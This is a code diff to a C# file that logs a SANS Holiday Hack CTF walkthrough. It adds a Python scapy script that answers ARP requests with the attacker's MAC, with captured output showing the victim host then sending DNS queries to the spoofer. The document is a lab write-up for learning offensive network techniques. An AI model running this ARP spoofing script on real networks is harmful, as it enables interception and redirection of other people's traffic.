@@ -129,34 +129,34 @@ namespace Janda.CTF.SANS.HolidayHack
         public void WonderingAround()
         {
             @"
-                # resolution or it will stall when reading:                                                                                                 │guest@452dd887658f:~$ 
-                ```                                                                                                                                         │
-                tshark -nnr arp.pcap                                                                                                                        │
-                tcpdump -nnr arp.pcap                                                                                                                       │
-                ```                                                                                                                                         │
-                                                                                                                                                            │
-                guest@452dd887658f:~$ tshark                                                                                                                │
-                Capturing on 'eth0'                                                                                                                         │
-                    1 0.000000000 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    2 1.031989483 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                ^C2 packets captured                                                                                                                        │
-                guest@452dd887658f:~$                                                                                                                       │
-                guest@452dd887658f:~$ tshark                                                                                                                │
-                Capturing on 'eth0'                                                                                                                         │
-                    1 0.000000000 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    2 1.039986867 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    3 2.075830381 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    4 3.131865014 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    5 4.171833866 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    6 5.203895329 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    7 6.255960599 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                    8 7.291827766 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                 │
-                ^C    9 8.328093002 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                               │
-                9 packets captured                                                                                                                          │
-                guest@452dd887658f:~$ cd pcaps/                                                                                                             │
-                guest@452dd887658f:~/pcaps$ tshark -nnr arp.pcap                                                                                            │
-                    1   0.000000 cc:01:10:dc:00:00 → ff:ff:ff:ff:ff:ff ARP 60 Who has 10.10.10.1? Tell 10.10.10.2                                           │
-                    2   0.031000 cc:00:10:dc:00:00 → cc:01:10:dc:00:00 ARP 60 10.10.10.1 is at cc:00:10:dc:00:00                                            │
+                # resolution or it will stall when reading:                                                                                                
+                ```                                                                                                                                        
+                tshark -nnr arp.pcap                                                                                                                       
+                tcpdump -nnr arp.pcap                                                                                                                      
+                ```                                                                                                                                        
+                                                                                                                                                           
+                guest@452dd887658f:~$ tshark                                                                                                               
+                Capturing on 'eth0'                                                                                                                        
+                    1 0.000000000 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    2 1.031989483 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                ^C2 packets captured                                                                                                                       
+                guest@452dd887658f:~$                                                                                                                      
+                guest@452dd887658f:~$ tshark                                                                                                               
+                Capturing on 'eth0'                                                                                                                        
+                    1 0.000000000 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    2 1.039986867 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    3 2.075830381 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    4 3.131865014 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    5 4.171833866 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    6 5.203895329 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    7 6.255960599 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                    8 7.291827766 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
+                ^C    9 8.328093002 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                              
+                9 packets captured                                                                                                                         
+                guest@452dd887658f:~$ cd pcaps/                                                                                                            
+                guest@452dd887658f:~/pcaps$ tshark -nnr arp.pcap                                                                                           
+                    1   0.000000 cc:01:10:dc:00:00 → ff:ff:ff:ff:ff:ff ARP 60 Who has 10.10.10.1? Tell 10.10.10.2                                          
+                    2   0.031000 cc:00:10:dc:00:00 → cc:01:10:dc:00:00 ARP 60 10.10.10.1 is at cc:00:10:dc:00:00                                           
                 guest@452dd887658f:~/pcaps$                               
 
             ".Blog(_logger);
@@ -473,12 +473,11 @@ namespace Janda.CTF.SANS.HolidayHack
 
 
             @"
-                3388 3397.343838237 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply) (duplicate use of 10.6.6.35 detected!)                                                                                                                                           │
+                3388 3397.343838237 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply) (duplicate use of 10.6.6.35 detected!)
                  
                 https://wiki.wireshark.org/Gratuitous_ARP#:~:text=Gratuitous%20ARPs%20are%20useful%20for%20four%20reasons%3A%201,to%20that%20MAC%20address%20...%20More%20items...%20
 
             ".Blog(_logger, "Using {code} I have discovered something called Gratuitous ARP", "arp_resp_02.py");
-
 
             @"
                  4013 3987.852213869 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply)             
@@ -489,6 +488,93 @@ namespace Janda.CTF.SANS.HolidayHack
                  4018 3990.944052549 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35        
 
             ".Blog(_logger, "Using {code} we still get Gratuitous ARP but no duplicate", "arp_resp_03.py");
+
+
+            @"
+                guest@b19f4c3c04f9:~$ nano arp_resp_04.py
+                ... 
+
+                #!/usr/bin/python3
+                from scapy.all import *
+                import netifaces as ni
+                import uuid
+                # Our eth0 ip
+                ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+                # Our eth0 mac address
+                macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+                print(ipaddr)
+                print(macaddr)
+                def handle_arp_packets(packet):
+                    # if arp request, then we need to fill this out to send back our mac as the response
+                    if ARP in packet and packet[ARP].op == 1:
+                        print(packet.sprintf(""<- op=%ARP.op% hwsrc=%ARP.hwsrc% psrc=%ARP.psrc% pdst=%ARP.pdst% hwdst=%ARP.hwdst%""))
+                        ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr)
+                        arp_response = ARP(pdst=macaddr)        
+                        arp_response.op = 2             # Opcode (reply) ""is-at""
+                        arp_response.plen = 4           # Protocol size
+                        arp_response.hwlen = 6          # Hardware size
+                        arp_response.ptype = 0x800      # Protocol type is IPv4 (0x800)
+                        arp_response.hwtype = 1         # Hardware type: Ethernet (1)
+                        arp_response.hwsrc = macaddr
+                        arp_response.psrc = packet[ARP].pdst
+                        arp_response.hwdst = packet[ARP].hwsrc
+                        arp_response.pdst = packet[ARP].psrc
+                        response = ether_resp/arp_response
+                        print(arp_response.sprintf(""=> op=%ARP.op% hwsrc=%ARP.hwsrc% psrc=%ARP.psrc% pdst=%ARP.pdst% hwdst=%ARP.hwdst%""))
+                        sendp(response, iface=""eth0"", verbose = 0)
+
+                def main():
+                    # We only want arp requests
+                    berkeley_packet_filter = ""(arp[6:2] = 1)""
+                    # sniffing for one packet that will be sent to a function, while storing none
+                    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=100)
+                if __name__ == ""__main__"":
+                    main()
+
+                ...
+                guest@b19f4c3c04f9:~$ chmod +x arp_resp_04.py 
+                guest@b19f4c3c04f9:~$ ./arp_resp_04.py               
+
+                10.6.0.4
+                02:42:0a:06:00:04
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
+
+
+                guest@b19f4c3c04f9:~$ tshark -n                                                                                                             
+                Capturing on 'eth0'                                                                                                                        
+                    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
+                    2 0.023991170 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
+                    3 0.052358930    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
+                    4 1.040034346 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
+                    5 1.063910552 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
+                    6 1.084385701    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
+                    7 2.079993078 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
+                    8 2.099982227 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
+                    9 2.120378861    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
+                   10 3.127982679 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
+                   11 3.151950098 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
+                   12 3.168600217    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
+                   13 4.167959632 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
+                   14 4.204196263 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
+                   15 4.220402011    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
+                   16 5.219938579 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
+                   17 5.243955227 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
+                   18 5.260375086    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+
+            ".Blog(_logger, "Final ARP script is {arpscript}", "arp_resp_04.py");
+
         }
     }
 }
+
